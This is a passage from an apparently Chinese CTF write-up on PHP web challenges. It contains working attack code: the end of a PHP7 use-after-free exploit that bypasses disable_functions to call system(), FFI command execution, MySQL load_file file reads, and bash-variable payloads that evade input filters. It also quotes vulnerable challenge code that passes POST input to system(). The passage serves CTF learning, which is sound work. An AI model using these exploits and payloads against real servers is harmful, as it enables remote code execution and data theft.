         return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        # str_shuffle prevents opcache string interning        $arg = str_shuffle(str_repeat(&#x27;A&#x27;, 79));        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;        die(&#x27;This PoC is for *nix systems only.&#x27;);    &#125;    $n_alloc = 10; # increase this value if UAF fails    $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(str_repeat(&#x27;A&#x27;, 79));    trigger_uaf(&#x27;x&#x27;);    $abc = $backtrace[1][&#x27;args&#x27;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#x27;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#x27;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#x27;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#x27;t get zif_system address&quot;);    &#125;    # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=new DirectoryIterator(<span class="string">&quot;glob:///*&quot;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$f</span>)&#123;<span class="built_in">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="built_in">exit</span>();</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-45-Web-73-—-disable-functions-—-DirectoryIterator"><a href="#1-45-Web-73-—-disable-functions-—-DirectoryIterator" class="headerlink" title="1.45 Web 73 — disable_functions — DirectoryIterator"></a>1.45 Web 73 — disable_functions — DirectoryIterator</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=new DirectoryIterator(<span class="string">&quot;glob:///*&quot;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$f</span>)&#123;<span class="built_in">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="built_in">exit</span>();<span class="comment"># bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="built_in">exit</span>();</span><br></pre></td></tr></table></figure><h2 id="1-46-Web-74-—-disable-functions-—-DirectoryIterator"><a href="#1-46-Web-74-—-disable-functions-—-DirectoryIterator" class="headerlink" title="1.46 Web 74 — disable_functions — DirectoryIterator"></a>1.46 Web 74 — disable_functions — DirectoryIterator</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=new DirectoryIterator(<span class="string">&quot;glob:///*&quot;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$f</span>)&#123;<span class="built_in">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="built_in">exit</span>();<span class="comment"># bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr varc=include(&#x27;/flagx.txt&#x27;);exit();</span></span><br></pre></td></tr></table></figure><h2 id="1-47-Web-75-—-disable-functions-—-数据库、SQL-语句"><a href="#1-47-Web-75-—-disable-functions-—-数据库、SQL-语句" class="headerlink" title="1.47 Web 75 — disable_functions — 数据库、SQL 语句"></a>1.47 Web 75 — disable_functions — 数据库、SQL 语句</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=new DirectoryIterator(<span class="string">&quot;glob:///*&quot;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$f</span>)&#123;<span class="built_in">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="built_in">exit</span>();<span class="comment"># bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span></span><br></pre></td></tr></table></figure><p><strong>SQL 语句绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;    <span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,        <span class="string">&#x27;root&#x27;</span>);    foreach (<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;        <span class="built_in">echo</span> (<span class="variable">$row</span>[0]) . <span class="string">&quot;|&quot;</span>;    &#125;    <span class="variable">$dbh</span> = null;&#125; catch (PDOException <span class="variable">$e</span>) &#123;    <span class="built_in">echo</span> <span class="variable">$e</span>-&gt;getMessage();    <span class="built_in">exit</span>(0);&#125;<span class="built_in">exit</span>(0);<span class="comment"># 即c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e&gt;getMessage();exit(0);&#125;exit(0);</span></span><br></pre></td></tr></table></figure><h2 id="1-48-Web-76-—-disable-functions-—-数据库、SQL-语句"><a href="#1-48-Web-76-—-disable-functions-—-数据库、SQL-语句" class="headerlink" title="1.48 Web 76 — disable_functions — 数据库、SQL 语句"></a>1.48 Web 76 — disable_functions — 数据库、SQL 语句</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=new DirectoryIterator(<span class="string">&quot;glob:///*&quot;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$f</span>)&#123;<span class="built_in">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="built_in">exit</span>();<span class="comment"># bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;    <span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,        <span class="string">&#x27;root&#x27;</span>);    foreach (<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;        <span class="built_in">echo</span> (<span class="variable">$row</span>[0]) . <span class="string">&quot;|&quot;</span>;    &#125;    <span class="variable">$dbh</span> = null;&#125; catch (PDOException <span class="variable">$e</span>) &#123;    <span class="built_in">echo</span> <span class="variable">$e</span>-&gt;getMessage();    <span class="built_in">exit</span>(0);&#125;<span class="built_in">exit</span>(0);<span class="comment"># 即c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e&gt;getMessage();exit(0);&#125;exit(0);</span></span><br></pre></td></tr></table></figure><h2 id="1-50-Web-77-—-disable-functions-—-FFI-扩展命令"><a href="#1-50-Web-77-—-disable-functions-—-FFI-扩展命令" class="headerlink" title="1.50 Web 77 — disable_functions — FFI 扩展命令"></a>1.50 Web 77 — disable_functions — FFI 扩展命令</h2><p><a href="https://blog.csdn.net/weixin_39871162/article/details/111650867">FFI 扩展命令  参考</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 版本 php7.4</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>扩展简介</strong><br>FFI 是在 PHP 7.4 版本中新加入的，此扩展允许在 PHP 代码中加载共享库(.DLL 或 .so)，调用 C 函数及访问 C 数据结构，简单的说就是允许在 PHP 中运行 C 代码，可以方便的调用C语言的各种库，但同时它的使用伴随着很大的风险</p></blockquote><blockquote><p><strong>使用配置</strong><br>使用 FFI 首先要开启扩展，在 php.ini 中去掉 extension=ffi 前面的 ; 并且修改 ffi.enable=true 即可使用，在phpinfo() 中可以查看是否开启了此扩展</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例&lt;?php     $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);    $ffi-&gt;system(&quot;echo Hello World&gt;./ttmp&quot;);    echo file_get_contents(&quot;./ttmp&quot;);?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>命令执行</strong></p><p>如果目标机器开启了这一扩展，我们就有了一种全新的命令执行方式，在 system 被禁用的情况下，则可使用 FFI 来进行命令执行，例如在题目中执行 /readflag 并获取 flag，同时它也可以加载自定义链接库</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令执行&lt;?php     $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);    $ffi-&gt;system(&quot;/readflag &gt; /tmp/123.txt&quot;);echo file_get_contents(&quot;/tmp/123&quot;);    @unlink(&quot;/tmp/123&quot;);?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>类似的方法在蚁剑的 bypass disable_function 中可自动调用，但受到目录权限和 open_basedir 的限制导致很多情况下并不起作用</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadc=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot;    &quot; ;&#125;exit();# bin boot dev etc flag36x.txt home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::cdef(    <span class="string">&quot;int system(const char *command);&quot;</span>);<span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;/readflag &gt; 1.txt&quot;</span>);<span class="built_in">exit</span>();<span class="comment"># 即c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt;test.txt&quot;);exit();# 随后访问 test.txt 即可</span></span><br></pre></td></tr></table></figure><h2 id="1-51-Web-118-—-Linux-bush-内置变量-—-PATH-A-PWD-A"><a href="#1-51-Web-118-—-Linux-bush-内置变量-—-PATH-A-PWD-A" class="headerlink" title="1.51 Web 118 — Linux bush 内置变量 — ${PATH:A}${PWD:A}"></a>1.51 Web 118 — Linux bush 内置变量 — ${PATH:<del>A}${PWD:</del>A}</h2><p>flag in flag.php</p><p>查看源代码 发现</p><p><img src="https://i.loli.net/2021/08/01/gEVwLJ1UaseCyzm.png" alt="image-20210801091022906"></p><p>抓包发现 是 POST 传参 code</p><p><strong>bush 内置变量</strong></p><p><a href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_12">https://www.cnblogs.com/sparkdev/p/9934595.html#title_12</a></p><p><a href="https://blog.51cto.com/allenh/1695810">https://blog.51cto.com/allenh/1695810</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试 root@kali:~# echo $&#123;PWD&#125;/rootroot@kali:~# echo $&#123;PWD:0:1&#125;/root@kali:~# echo $&#123;PWD:0:2&#125;/rroot@kali:~# echo $&#123;PWD:1:2&#125;roroot@kali:~/桌面# echo $&#123;PWD&#125;/root/桌面root@kali:~/桌面# echo $&#123;PWD:~0&#125;面root@kali:~/桌面# echo $&#123;PWD:~2&#125;/桌面root@kali:~/桌面# echo $&#123;PWD:~1&#125;桌面# 如果过滤掉了数字，可使用字母，字母都相当于 0root@kali:~/桌面# echo $&#123;PWD:~A&#125;面root@kali:~/桌面# echo $&#123;PWD:~C&#125;面root@kali:~/桌面# echo $&#123;PWD:~K&#125;面root@kali:/var/www/html# echo $&#123;PWD::2&#125;/vroot@kali:/var/www/html# echo $&#123;PWD::1&#125;/# 构造 nlroot@kali:~/桌面# cd /var/www/html/root@kali:/var/www/html# echo $&#123;PATH&#125;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binroot@kali:/var/www/html# echo $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;nl</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????????</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/01/D5NkR79Zq4dQMiO.png" alt="image-20210801110025912"></p><h2 id="1-52-Web-119-—-Linux-bush-内置变量-—-构造-bin"><a href="#1-52-Web-119-—-Linux-bush-内置变量-—-构造-bin" class="headerlink" title="1.52 Web 119 —  Linux bush 内置变量 — 构造 /bin/"></a>1.52 Web 119 —  Linux bush 内置变量 — 构造 /bin/</h2><p>过滤了 PATH  和  BASH</p><p><strong>一些知识点</strong></p><ul><li>大写字母等同于0</li><li>不加#是变量的值，加了#是变量的值的长度</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;#PWD&#125;</span>root@kali:/var/www/html<span class="comment"># echo $&#123;PWD&#125;/var/www/htmlroot@kali:/var/www/html# echo $&#123;#PWD&#125;13</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>RANDOM</strong><br>此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。</p><p>因此光利用RANDOM这个函数理论上就可以得到数字1-5了，不过相对来说4和5的概率会更大。</p><p><strong>SHLVL</strong>        是记录多个 Bash 进程实例嵌套深度的累加器</p><p>不理解也没关系，只要知道这个东西的默认值是1，而且如果不进行一些特殊的操作的话，永远都是1，所以这个可以帮助我们得到数字1。</p></blockquote><p><img src="https://i.loli.net/2021/08/01/S1Xw8eTFWKQdlgm.png" alt="image-20210801111732610"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 /bin/base64 flag.php$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???或$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???# 构造 /bin/cat flag.php这个是hint$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     ====&gt;   t$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    ====&gt;   /$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadcode=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br></pre></td></tr></table></figure><p>抓包修改 多刷新几遍 由于 4 和 5不确定</p><h2 id="1-53-Web-120-—-Linux-bush-内置变量-—-长度限制-lt-65"><a href="#1-53-Web-120-—-Linux-bush-内置变量-—-长度限制-lt-65" class="headerlink" title="1.53 Web 120 —  Linux bush 内置变量 — 长度限制 &lt;=65"></a>1.53 Web 120 —  Linux bush 内置变量 — 长度限制 &lt;=65</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;</span>|\&quot;|\`|\||\,/<span class="string">&#x27;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#x27;</span>&lt;div align=<span class="string">&quot;center&quot;</span>&gt;<span class="string">&#x27;.&#x27;</span>you are so long , I dont like <span class="string">&#x27;.&#x27;</span>&lt;/div&gt;<span class="string">&#x27;;        &#125;        else&#123;        echo &#x27;</span>&lt;div align=<span class="string">&quot;center&quot;</span>&gt;<span class="string">&#x27;.system($code).&#x27;</span>&lt;/div&gt;<span class="string">&#x27;;        &#125;    &#125;    else&#123;     echo &#x27;</span>&lt;div align=<span class="string">&quot;center&quot;</span>&gt;evil input&lt;/div&gt;<span class="string">&#x27;;    &#125;&#125;?&gt;</span></span><br></pre></td></tr></table></figure><p>限制长度 &lt;=65</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadcode=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br></pre></td></tr></table></figure><h2 id="1-54-Web-121-—-Linux-bush-内置变量-—-过滤-SHLVL"><a href="#1-54-Web-121-—-Linux-bush-内置变量-—-过滤-SHLVL" class="headerlink" title="1.54 Web 121 —  Linux bush 内置变量 — 过滤 SHLVL"></a>1.54 Web 121 —  Linux bush 内置变量 — 过滤 SHLVL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;</span>|\&quot;|\`|\||\,/<span class="string">&#x27;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#x27;</span>&lt;div align=<span class="string">&quot;center&quot;</span>&gt;<span class="string">&#x27;.&#x27;</span>you are so long , I dont like <span class="string">&#x27;.&#x27;</span>&lt;/div&gt;<span class="string">&#x27;;        &#125;        else&#123;        echo &#x27;</span>&lt;div align=<span class="string">&quot;center&quot;</span>&gt;<span class="string">&#x27;.system($code).&#x27;</span>&lt;/div&gt;<span class="string">&#x27;;        &#125;    &#125;    else&#123;     echo &#x27;</span>&lt;div align=<span class="string">&quot;center&quot;</span>&gt;evil input&lt;/div&gt;<span class="string">&#x27;;    &#125;&#125;?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/var/www/html<span class="comment"># echo $&#123;##&#125;1root@kali:/var/www/html# echo $&#123;#?&#125;1root@kali:/var/www/html/learn# touch 1.txt root@kali:/var/www/html/learn# echo &#x27;1234567&#x27; &gt; 1.txtroot@kali:/var/www/html/learn# /bin/rev 1.1.txtroot@kali:/var/www/html/learn# /bin/rev 1.txt7654321# /bin/rev 将文件反读root@kali:/var/www/html/learn# echo $&#123;#IFS&#125;3root@kali:/var/www/html/learn# echo $&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;rroot@kali:/var/www/html/learn# echo $&#123;PWD&#125;/var/www/html/learnroot@kali:/var/www/html/learn# echo $&#123;PWD:3:1&#125;r</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span></span><br></pre></td></tr></table></figure><h2 id="1-55-Web-122-—-Linux-bush-内置变量-—-过滤-PWD-HOME替换"><a href="#1-55-Web-122-—-Linux-bush-内置变量-—-过滤-PWD-HOME替换" class="headerlink" title="1.55 Web 122 —  Linux bush 内置变量 — 过滤 # PWD ( HOME替换 )"></a>1.55 Web 122 —  Linux bush 内置变量 — 过滤 # PWD ( HOME替换 )</h2><blockquote><p><strong>$?</strong></p><p>获取上一条命令执行结束后的返回值，0代表成功，非0代表失败。而且这个返回值原来是可控的</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;OS error code   1:  Operation not permitted&quot;</span><span class="string">&quot;OS error code   2:  No such file or directory&quot;</span><span class="string">&quot;OS error code   3:  No such process&quot;</span><span class="string">&quot;OS error code   4:  Interrupted system call&quot;</span><span class="string">&quot;OS error code   5:  Input/output error&quot;</span><span class="string">&quot;OS error code   6:  No such device or address&quot;</span><span class="string">&quot;OS error code   7:  Argument list too long&quot;</span><span class="string">&quot;OS error code   8:  Exec format error&quot;</span><span class="string">&quot;OS error code   9:  Bad file descriptor&quot;</span><span class="string">&quot;OS error code  10:  No child processes&quot;</span><span class="string">&quot;OS error code  11:  Resource temporarily unavailable&quot;</span><span class="string">&quot;OS error code  12:  Cannot allocate memory&quot;</span><span class="string">&quot;OS error code  13:  Permission denied&quot;</span><span class="string">&quot;OS error code  14:  Bad address&quot;</span><span class="string">&quot;OS error code  15:  Block device required&quot;</span><span class="string">&quot;OS error code  16:  Device or resource busy&quot;</span><span class="string">&quot;OS error code  17:  File exists&quot;</span><span class="string">&quot;OS error code  18:  Invalid cross-device link&quot;</span><span class="string">&quot;OS error code  19:  No such device&quot;</span><span class="string">&quot;OS error code  20:  Not a directory&quot;</span><span class="string">&quot;OS error code  21:  Is a directory&quot;</span><span class="string">&quot;OS error code  22:  Invalid argument&quot;</span><span class="string">&quot;OS error code  23:  Too many open files in system&quot;</span><span class="string">&quot;OS error code  24:  Too many open files&quot;</span><span class="string">&quot;OS error code  25:  Inappropriate ioctl for device&quot;</span><span class="string">&quot;OS error code  26:  Text file busy&quot;</span><span class="string">&quot;OS error code  27:  File too large&quot;</span><span class="string">&quot;OS error code  28:  No space left on device&quot;</span><span class="string">&quot;OS error code  29:  Illegal seek&quot;</span><span class="string">&quot;OS error code  30:  Read-only file system&quot;</span><span class="string">&quot;OS error code  31:  Too many links&quot;</span><span class="string">&quot;OS error code  32:  Broken pipe&quot;</span><span class="string">&quot;OS error code  33:  Numerical argument out of domain&quot;</span><span class="string">&quot;OS error code  34:  Numerical result out of range&quot;</span><span class="string">&quot;OS error code  35:  Resource deadlock avoided&quot;</span><span class="string">&quot;OS error code  36:  File name too long&quot;</span><span class="string">&quot;OS error code  37:  No locks available&quot;</span><span class="string">&quot;OS error code  38:  Function not implemented&quot;</span><span class="string">&quot;OS error code  39:  Directory not empty&quot;</span><span class="string">&quot;OS error code  40:  Too many levels of symbolic links&quot;</span><span class="string">&quot;OS error code  42:  No message of desired type&quot;</span><span class="string">&quot;OS error code  43:  Identifier removed&quot;</span><span class="string">&quot;OS error code  44:  Channel number out of range&quot;</span><span class="string">&quot;OS error code  45:  Level 2 not synchronized&quot;</span><span class="string">&quot;OS error code  46:  Level 3 halted&quot;</span><span class="string">&quot;OS error code  47:  Level 3 reset&quot;</span><span class="string">&quot;OS error code  48:  Link number out of range&quot;</span><span class="string">&quot;OS error code  49:  Protocol driver not attached&quot;</span><span class="string">&quot;OS error code  50:  No CSI structure available&quot;</span><span class="string">&quot;OS error code  51:  Level 2 halted&quot;</span><span class="string">&quot;OS error code  52:  Invalid exchange&quot;</span><span class="string">&quot;OS error code  53:  Invalid request descriptor&quot;</span><span class="string">&quot;OS error code  54:  Exchange full&quot;</span><span class="string">&quot;OS error code  55:  No anode&quot;</span><span class="string">&quot;OS error code  56:  Invalid request code&quot;</span><span class="string">&quot;OS error code  57:  Invalid slot&quot;</span><span class="string">&quot;OS error code  59:  Bad font file format&quot;</span><span class="string">&quot;OS error code  60:  Device not a stream&quot;</span><span class="string">&quot;OS error code  61:  No data available&quot;</span><span class="string">&quot;OS error code  62:  Timer expired&quot;</span><span class="string">&quot;OS error code  63:  Out of streams resources&quot;</span><span class="string">&quot;OS error code  64:  Machine is not on the network&quot;</span><span class="string">&quot;OS error code  65:  Package not installed&quot;</span><span class="string">&quot;OS error code  66:  Object is remote&quot;</span><span class="string">&quot;OS error code  67:  Link has been severed&quot;</span><span class="string">&quot;OS error code  68:  Advertise error&quot;</span><span class="string">&quot;OS error code  69:  Srmount error&quot;</span><span class="string">&quot;OS error code  70:  Communication error on send&quot;</span><span class="string">&quot;OS error code  71:  Protocol error&quot;</span><span class="string">&quot;OS error code  72:  Multihop attempted&quot;</span><span class="string">&quot;OS error code  73:  RFS specific error&quot;</span><span class="string">&quot;OS error code  74:  Bad message&quot;</span><span class="string">&quot;OS error code  75:  Value too large for defined data type&quot;</span><span class="string">&quot;OS error code  76:  Name not unique on network&quot;</span><span class="string">&quot;OS error code  77:  File descriptor in bad state&quot;</span><span class="string">&quot;OS error code  78:  Remote address changed&quot;</span><span class="string">&quot;OS error code  79:  Can not access a needed shared library&quot;</span><span class="string">&quot;OS error code  80:  Accessing a corrupted shared library&quot;</span><span class="string">&quot;OS error code  81:  .lib section in a.out corrupted&quot;</span><span class="string">&quot;OS error code  82:  Attempting to link in too many shared libraries&quot;</span><span class="string">&quot;OS error code  83:  Cannot exec a shared library directly&quot;</span><span class="string">&quot;OS error code  84:  Invalid or incomplete multibyte or wide character&quot;</span><span class="string">&quot;OS error code  85:  Interrupted system call should be restarted&quot;</span><span class="string">&quot;OS error code  86:  Streams pipe error&quot;</span><span class="string">&quot;OS error code  87:  Too many users&quot;</span><span class="string">&quot;OS error code  88:  Socket operation on non-socket&quot;</span><span class="string">&quot;OS error code  89:  Destination address required&quot;</span><span class="string">&quot;OS error code  90:  Message too long&quot;</span><span class="string">&quot;OS error code  91:  Protocol wrong type for socket&quot;</span><span class="string">&quot;OS error code  92:  Protocol not available&quot;</span><span class="string">&quot;OS error code  93:  Protocol not supported&quot;</span><span class="string">&quot;OS error code  94:  